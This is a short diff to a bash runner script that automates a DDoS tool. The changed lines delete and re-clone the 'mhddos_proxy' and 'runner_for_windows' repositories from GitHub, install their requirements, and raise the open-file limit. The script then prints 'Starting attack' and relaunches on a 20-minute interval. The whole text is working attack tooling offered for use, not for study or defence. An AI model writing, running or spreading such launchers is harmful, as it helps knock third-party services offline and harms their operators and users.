@@ -1,5 +1,14 @@
 #!/bin/bash
 
+#Installing files into correct directory
+cd ~
+rm -rf mhddos_proxy
+rm -rf runner_for_windows
+git clone https://github.com/alexnest-ua/runner_for_windows.git
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd ~/mhddos_proxy
+python -m pip install -r requirements.txt
+
 restart_interval="20m"
 
 ulimit -n 1048576
@@ -71,10 +80,7 @@ echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack
 sleep 7s
 
 
-#Installing files into correct directory
-cd ~
-git clone https://github.com/alexnest-ua/runner_for_windows.git
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+
 
 
 
